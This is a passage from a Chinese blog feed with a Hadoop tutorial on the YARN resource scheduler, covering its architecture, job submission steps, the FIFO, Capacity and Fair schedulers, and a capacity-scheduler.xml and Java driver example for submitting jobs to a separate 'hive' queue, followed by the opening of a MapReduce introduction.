      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="1-Yarn资源调度器"><a href="#1-Yarn资源调度器" class="headerlink" title="1 Yarn资源调度器"></a>1 Yarn资源调度器</h1><p>Yarn是一个资源调度平台，负责为运算程序提供服务器运算资源，相当于一个分布式的操作系统平台，而MapReduce等运算程序则相当于运行于操作系统之上的应用程序。</p><h2 id="1-1-Yarn基本架构"><a href="#1-1-Yarn基本架构" class="headerlink" title="1.1 Yarn基本架构"></a>1.1 Yarn基本架构</h2><pre><code> YARN主要由ResourceManager、NodeManager、ApplicationMaster和Container等组件构成。</code></pre><p><img src="/2020/11/12/bigdata-yarn-framework/1638343400280.png" alt="1638343400280"></p><h2 id="1-2-Yarn工作机制"><a href="#1-2-Yarn工作机制" class="headerlink" title="1.2 Yarn工作机制"></a>1.2 Yarn工作机制</h2><p><img src="/2020/11/12/bigdata-yarn-framework/1638343444066.png" alt="1638343444066"></p><p>（1）MR程序提交到客户端所在的节点。<br>（2）YarnRunner向ResourceManager申请一个Application。<br>（3）RM将该应用程序的资源路径返回给YarnRunner。<br>（4）该程序将运行所需资源提交到HDFS上。<br>（5）程序资源提交完毕后，申请运行mrAppMaster。<br>（6）RM将用户的请求初始化成一个Task。<br>（7）其中一个NodeManager领取到Task任务。<br>（8）该NodeManager创建容器Container，并产生MRAppmaster。<br>（9）Container从HDFS上拷贝资源到本地。<br>（10）MRAppmaster向RM 申请运行MapTask资源。<br>（11）RM将运行MapTask任务分配给另外两个NodeManager，另两个NodeManager分别领取任务并创建容器。<br>（12）MR向两个接收到任务的NodeManager发送程序启动脚本，这两个NodeManager分别启动MapTask，MapTask对数据分区排序。<br>（13）MrAppMaster等待所有MapTask运行完毕后，向RM申请容器，运行ReduceTask。<br>（14）ReduceTask向MapTask获取相应分区的数据。<br>（15）程序运行完毕后，MR会向RM申请注销自己。</p><h2 id="1-3-作业提交全过程"><a href="#1-3-作业提交全过程" class="headerlink" title="1.3 作业提交全过程"></a>1.3 作业提交全过程</h2><p>作业提交工作机制</p><p><img src="/2020/11/12/bigdata-yarn-framework/1638343485216.png" alt="1638343485216"></p><p>作业提交全过程详解</p><p>（1）作业提交<br>第1步：Client调用job.waitForCompletion方法，向整个集群提交MapReduce作业。<br>第2步：Client向RM申请一个作业id。<br>第3步：RM给Client返回该job资源的提交路径和作业id。<br>第4步：Client提交jar包、切片信息和配置文件到指定的资源提交路径。<br>第5步：Client提交完资源后，向RM申请运行MrAppMaster。<br>（2）作业初始化<br>第6步：当RM收到Client的请求后，将该job添加到容量调度器中。<br>第7步：某一个空闲的NM领取到该Job。<br>第8步：该NM创建Container，并产生MRAppmaster。<br>第9步：下载Client提交的资源到本地。<br>（3）任务分配<br>第10步：MrAppMaster向RM申请运行多个MapTask任务资源。<br>第11步：RM将运行MapTask任务分配给另外两个NodeManager，另两个NodeManager分别领取任务并创建容器。<br>（4）任务运行<br>第12步：MR向两个接收到任务的NodeManager发送程序启动脚本，这两个NodeManager分别启动MapTask，MapTask对数据分区排序。<br>第13步：MrAppMaster等待所有MapTask运行完毕后，向RM申请容器，运行ReduceTask。<br>第14步：ReduceTask向MapTask获取相应分区的数据。<br>第15步：程序运行完毕后，MR会向RM申请注销自己。<br>（5）进度和状态更新<br>YARN中的任务将其进度和状态(包括counter)返回给应用管理器, 客户端每秒(通过mapreduce.client.progressmonitor.pollinterval设置)向应用管理器请求进度更新, 展示给用户。<br>（6）作业完成<br>除了向应用管理器请求作业进度外, 客户端每5秒都会通过调用waitForCompletion()来检查作业是否完成。时间间隔可以通过mapreduce.client.completion.pollinterval来设置。作业完成之后, 应用管理器和Container会清理工作状态。作业的信息会被作业历史服务器存储以备之后用户核查。</p><p><img src="/2020/11/12/bigdata-yarn-framework/1638343533411.png" alt="1638343533411"></p><h2 id="1-4-资源调度器"><a href="#1-4-资源调度器" class="headerlink" title="1.4 资源调度器"></a>1.4 资源调度器</h2><p>目前，Hadoop作业调度器主要有三种：FIFO、Capacity Scheduler和Fair Scheduler。Hadoop3.1.3默认的资源调度器是Capacity Scheduler。<br>具体设置详见：yarn-default.xml文件</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">></span></span>The class to use as the resource scheduler.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>yarn.resourcemanager.scheduler.class<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>org.apache.hadoop.yarn.server.resourcemanager.scheduler.capacity.CapacityScheduler<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-4-1-先进先出调度器（FIFO）"><a href="#1-4-1-先进先出调度器（FIFO）" class="headerlink" title="1.4.1 先进先出调度器（FIFO）"></a>1.4.1 先进先出调度器（FIFO）</h3><p><img src="/2020/11/12/bigdata-yarn-framework/1638343565235.png" alt="1638343565235"></p><p>Hadoop最初设计目的是支持大数据批处理作业，如日志挖掘、Web索引等作业，<br>为此，Hadoop仅提供了一个非常简单的调度机制：FIFO，即先来先服务，在该调度机制下，所有作业被统一提交到一个队列中，Hadoop按照提交顺序依次运行这些作业。<br>但随着Hadoop的普及，单个Hadoop集群的用户量越来越大，不同用户提交的应用程序往往具有不同的服务质量要求，典型的应用有以下几种：<br>批处理作业：这种作业往往耗时较长，对时间完成一般没有严格要求，如数据挖掘、机器学习等方面的应用程序。<br>交互式作业：这种作业期望能及时返回结果，如SQL查询（Hive）等。<br>生产性作业：这种作业要求有一定量的资源保证，如统计值计算、垃圾数据分析等。<br>此外，这些应用程序对硬件资源需求量也是不同的，如过滤、统计类作业一般为CPU密集型作业，而数据挖掘、机器学习作业一般为I/O密集型作业。因此，简单的FIFO调度策略不仅不能满足多样化需求，也不能充分利用硬件资源。</p><h3 id="1-4-2-容量调度器（Capacity-Scheduler）"><a href="#1-4-2-容量调度器（Capacity-Scheduler）" class="headerlink" title="1.4.2 容量调度器（Capacity Scheduler）"></a>1.4.2 容量调度器（Capacity Scheduler）</h3><p><img src="/2020/11/12/bigdata-yarn-framework/1638343621340.png" alt="1638343621340"></p><p>Capacity Scheduler Capacity Scheduler 是Yahoo开发的多用户调度器，它以队列为单位划分资源，每个队列可设定一定比例的资源最低保证和使用上限，同时，每个用户也可设定一定的资源使用上限以防止资源滥用。而当一个队列的资源有剩余时，可暂时将剩余资源共享给其他队列。<br>    总之，Capacity Scheduler 主要有以下几个特点：<br>①容量保证。管理员可为每个队列设置资源最低保证和资源使用上限，而所有提交到该队列的应用程序共享这些资源。<br>②灵活性，如果一个队列中的资源有剩余，可以暂时共享给那些需要资源的队列，而一旦该队列有新的应用程序提交，则其他队列借调的资源会归还给该队列。这种资源灵活分配的方式可明显提高资源利用率。<br>③多重租赁。支持多用户共享集群和多应用程序同时运行。为防止单个应用程序、用户或者队列独占集群中的资源，管理员可为之增加多重约束（比如单个应用程序同时运行的任务数等）。<br>④安全保证。每个队列有严格的ACL列表规定它的访问用户，每个用户可指定哪些用户允许查看自己应用程序的运行状态或者控制应用程序（比如杀死应用程序）。此外，管理员可指定队列管理员和集群系统管理员。<br>⑤动态更新配置文件。管理员可根据需要动态修改各种配置参数，以实现在线集群管理。</p><h3 id="1-4-3-公平调度器（Fair-Scheduler）（了解）"><a href="#1-4-3-公平调度器（Fair-Scheduler）（了解）" class="headerlink" title="1.4.3 公平调度器（Fair Scheduler）（了解）"></a>1.4.3 公平调度器（Fair Scheduler）（了解）</h3><p><img src="/2020/11/12/bigdata-yarn-framework/1638343637281.png" alt="1638343637281"></p><p>Fair Scheduler Fair Schedulere是Facebook开发的多用户调度器。<br>    公平调度器的目的是让所有的作业随着时间的推移，都能平均地获取等同的共享资源。当有作业提交上来，系统会将空闲的资源分配给新的作业，每个任务大致上会获取平等数量的资源。和传统的调度策略不同的是它会让小的任务在合理的时间完成，同时不会让需要长时间运行的耗费大量资源的任务挨饿！<br>    同Capacity Scheduler类似，它以队列为单位划分资源，每个队列可设定一定比例的资源最低保证和使用上限，同时，每个用户也可设定一定的资源使用上限以防止资源滥用；当一个队列的资源有剩余时，可暂时将剩余资源共享给其他队列。<br>    当然，Fair Scheduler也存在很多与Capacity Scheduler不同之处，这主要体现在以下几个方面：<br>①    资源公平共享。在每个队列中，Fair Scheduler 可选择按照FIFO、Fair或DRF策略为应用程序分配资源。其中，<br><strong>FIFO策略</strong><br>公平调度器每个队列资源分配策略如果选择FIFO的话，就是禁用掉每个队列中的Task共享队列资源，此时公平调度器相当于上面讲过的容量调度器。<br>Fair策略<br>Fair 策略(默认)是一种基于最大最小公平算法实现的资源多路复用方式，默认情况下，每个队列内部采用该方式分配资源。这意味着，如果一个队列中有两个应用程序同时运行，则每个应用程序可得到1/2的资源；如果三个应用程序同时运行，则每个应用程序可得到1/3的资源。</p><p><strong>DRF策略</strong><br>DRF(Dominant Resource Fairness)，我们之前说的资源，都是单一标准，例如只考虑内存(也是yarn默认的情况)。但是很多时候我们资源有很多种，例如内存，CPU，网络带宽等，这样我们很难衡量两个应用应该分配的资源比例。<br>那么在YARN中，我们用DRF来决定如何调度：假设集群一共有100 CPU和10T 内存，而应用A需要(2 CPU, 300GB)，应用B需要(6 CPU, 100GB)。则两个应用分别需要A(2%CPU, 3%内存)和B(6%CPU, 1%内存)的资源，这就意味着A是内存主导的, B是CPU主导的，针对这种情况，我们可以选择DRF策略对不同应用进行不同资源（CPU和内存）的一个不同比例的限制。<br>②支持资源抢占。当某个队列中有剩余资源时，调度器会将这些资源共享给其他队列，而当该队列中有新的应用程序提交时，调度器要为它回收资源。为了尽可能降低不必要的计算浪费，调度器采用了先等待再强制回收的策略，即如果等待一段时间后尚有未归还的资源，则会进行资源抢占：从那些超额使用资源的队列中杀死一部分任务，进而释放资源。<br>yarn.scheduler.fair.preemption=true 通过该配置开启资源抢占。<br>③提高小应用程序响应时间。由于采用了最大最小公平算法，小作业可以快速获取资源并运行完成</p><h1 id="2-容量调度器多队列提交案例"><a href="#2-容量调度器多队列提交案例" class="headerlink" title="2 容量调度器多队列提交案例"></a>2 容量调度器多队列提交案例</h1><h2 id="2-1-需求"><a href="#2-1-需求" class="headerlink" title="2.1 需求"></a>2.1 需求</h2><p>​    Yarn默认的容量调度器是一条单队列的调度器，在实际使用中会出现单个任务阻塞整个队列的情况。同时，随着业务的增长，公司需要分业务限制集群使用率。这就需要我们按照业务种类配置多条任务队列。</p><h2 id="2-2-配置多队列的容量调度器"><a href="#2-2-配置多队列的容量调度器" class="headerlink" title="2.2 配置多队列的容量调度器"></a>2.2 配置多队列的容量调度器</h2><p>默认Yarn的配置下，容量调度器只有一条Default队列。在capacity-scheduler.xml中可以配置多条队列，并降低default队列资源占比：</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token comment" spellcheck="true">&lt;!-- 指定多队列，增加hive队列 --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>yarn.scheduler.capacity.root.queues<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>default,hive<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">></span></span>      The queues at the this level (root is the root queue).    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!-- 降低default队列资源额定容量为40%，默认100% --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>yarn.scheduler.capacity.root.default.capacity<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>40<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!-- 降低default队列资源最大容量为60%，默认100% --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>yarn.scheduler.capacity.root.default.maximum-capacity<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>60<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>同时为新加队列添加必要属性：<span class="token comment" spellcheck="true">&lt;!-- 指定hive队列的资源额定容量 --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>yarn.scheduler.capacity.root.hive.capacity<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>60<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>yarn.scheduler.capacity.root.hive.user-limit-factor<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!-- 指定hive队列的资源最大容量 --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>yarn.scheduler.capacity.root.hive.maximum-capacity<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>yarn.scheduler.capacity.root.hive.state<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>RUNNING<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>yarn.scheduler.capacity.root.hive.acl_submit_applications<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>*<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>yarn.scheduler.capacity.root.hive.acl_administer_queue<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>*<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>yarn.scheduler.capacity.root.hive.acl_application_max_priority<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>*<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>yarn.scheduler.capacity.root.hive.maximum-application-lifetime<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>-1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>yarn.scheduler.capacity.root.hive.default-application-lifetime<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>-1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在配置完成后，重启Yarn或者执行yarn rmadmin -refreshQueues刷新队列，就可以看到两条队列：</p><p><img src="/2020/11/12/bigdata-yarn-framework/1638343702545.png" alt="1638343702545"></p><p>在配置完成后，重启Yarn或者执行yarn rmadmin -refreshQueues刷新队列，就可以看到两条队列：</p><h2 id="2-3-向Hive队列提交任务"><a href="#2-3-向Hive队列提交任务" class="headerlink" title="2.3 向Hive队列提交任务"></a>2.3 向Hive队列提交任务</h2><p>​    默认的任务提交都是提交到default队列的。如果希望向其他队列提交任务，需要在Driver中声明：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">WcDrvier</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>​    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException<span class="token punctuation">,</span> InterruptedException <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>​        Configuration configuration <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Configuration</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>​    configuration<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"mapreduce.job.queuename"</span><span class="token punctuation">,</span><span class="token string">"hive"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>​    <span class="token comment" spellcheck="true">//1. 获取一个Job实例</span>​    Job job <span class="token operator">=</span> Job<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span>configuration<span class="token punctuation">)</span><span class="token punctuation">;</span>​    <span class="token comment" spellcheck="true">//2. 设置类路径</span>​    job<span class="token punctuation">.</span><span class="token function">setJarByClass</span><span class="token punctuation">(</span>WcDrvier<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>​    <span class="token comment" spellcheck="true">//3. 设置Mapper和Reducer</span>​    job<span class="token punctuation">.</span><span class="token function">setMapperClass</span><span class="token punctuation">(</span>WcMapper<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>​    job<span class="token punctuation">.</span><span class="token function">setReducerClass</span><span class="token punctuation">(</span>WcReducer<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>​    <span class="token comment" spellcheck="true">//4. 设置Mapper和Reducer的输出类型</span>​    job<span class="token punctuation">.</span><span class="token function">setMapOutputKeyClass</span><span class="token punctuation">(</span>Text<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>​    job<span class="token punctuation">.</span><span class="token function">setMapOutputValueClass</span><span class="token punctuation">(</span>IntWritable<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>​    job<span class="token punctuation">.</span><span class="token function">setOutputKeyClass</span><span class="token punctuation">(</span>Text<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>​    job<span class="token punctuation">.</span><span class="token function">setOutputValueClass</span><span class="token punctuation">(</span>IntWritable<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>​    job<span class="token punctuation">.</span><span class="token function">setCombinerClass</span><span class="token punctuation">(</span>WcReducer<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>​    <span class="token comment" spellcheck="true">//5. 设置输入输出文件</span>​    FileInputFormat<span class="token punctuation">.</span><span class="token function">setInputPaths</span><span class="token punctuation">(</span>job<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Path</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>​    FileOutputFormat<span class="token punctuation">.</span><span class="token function">setOutputPath</span><span class="token punctuation">(</span>job<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Path</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>​    <span class="token comment" spellcheck="true">//6. 提交Job</span>​    <span class="token keyword">boolean</span> b <span class="token operator">=</span> job<span class="token punctuation">.</span><span class="token function">waitForCompletion</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>​    System<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span>b <span class="token operator">?</span> <span class="token number">0</span> <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样，这个任务在集群提交时，就会提交到hive队列：</p><p>这样，这个任务在集群提交时，就会提交到hive队列：</p><p><img src="/2020/11/12/bigdata-yarn-framework/1638343722576.png" alt="1638343722576"></p>]]></content:encoded>
      
      
      <category domain="https://m01ly.github.io/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%BC%80%E5%8F%91/">大数据开发</category>
      
      
      <category domain="https://m01ly.github.io/tags/Hadoop/">Hadoop</category>
      
      
      <comments>https://m01ly.github.io/2020/11/12/bigdata-yarn-framework/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Hadoop 教程（四）mapreduce介绍</title>
      <link>https://m01ly.github.io/2020/11/12/bigdata-mapreduce1-setup/</link>
      <guid>https://m01ly.github.io/2020/11/12/bigdata-mapreduce1-setup/</guid>
      <pubDate>Thu, 12 Nov 2020 07:04:15 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="第1章-MapReduce概述"><a href="#第1章-MapReduce概述" class="headerlink" title="第1章 MapReduce概述"></a>第1章 MapReduce概述</h1><h2 id="1-1-MapReduce定义"><a href="#1-1-MapReduce定义" class="headerlink" title="1.1 MapReduce定义"></a>1.1 MapReduce定义</h2><p>MapReduce是一个分布式运算程序的编程框架，是用户开发“基于Hadoop的数据分析应用”的核心框架。</p><p>MapReduce核心功能是将用户编写的业务逻辑代码和自带默认组件整合成一个完整的分布式运算程序，并行运行在一个Hadoop集群上。</p><h2 id="1-2-MapReduce优缺点"><a href="#1-2-MapReduce优缺点" class="headerlink" title="1.2 MapReduce优缺点"></a>1.2 MapReduce优缺点</h2><h3 id="1-2-1-优点"><a href="#1-2-1-优点" class="headerlink" title="1.2.1 优点"></a>1.2.1 优点</h3><p>1）MapReduce 易于编程</p><p>它简单的实现一些接口，就可以完成一个分布式程序，这个分布式程序可以分布到大量廉价的PC机器上运行。也就是说你写一个分布式程序，跟写一个简单的串行程序是一模一样的。就是因为这个特点使得MapReduce编程变得非常流行。</p><p>2）良好的扩展性</p><p>当你的计算资源不能得到满足的时候，你可以通过简单的增加机器来扩展它的计算能力。</p><p>3）高容错性</p><p>MapReduce设计的初衷就是使程序能够部署在廉价的PC机器上，这就要求它具有很高的容错性。比如其中一台机器挂了，它可以把上面的计算任务转移到另外一个节点上运行，不至于这个任务运行失败，而且这个过程不需要人工参与，而完全是由Hadoop内部完成的。</p><p>4）适合PB级以上海量数据的离线处理</p><p>可以实现上千台服务器集群并发工作，提供数据处理能力。</p><h3 id="1-2-2-缺点"><a href="#1-2-2-缺点" class="headerlink" title="1.2.2 缺点"></a>1.2.2 缺点</h3><p>1）不擅长实时计算</p><p>MapReduce无法像MySQL一样，在毫秒或者秒级内返回结果。</p><p>2）不擅长流式计算</p><p>流式计算的输入数据是动态的，而MapReduce的输入数据集是静态的，不能动态变化。这是因为MapReduce自身的设计特点决定了数据源必须是静态的。</p><p>3）不擅长DAG（有向无环图）计算</p><p>多个应用程序存在依赖关系，后一个应用程序的输入为前一个的输出。在这种情况下，MapReduce并不是不能做，而是使用后，每个MapReduce作业的输出结果都会写入到磁盘，会造成大量的磁盘IO，导致性能非常的低下。</p><h2 id="1-3-MapReduce核心思想"><a href="#1-3-MapReduce核心思想" class="headerlink" title="1.3 MapReduce核心思想"></a>1.3 MapReduce核心思想</h2><p>​                   <img 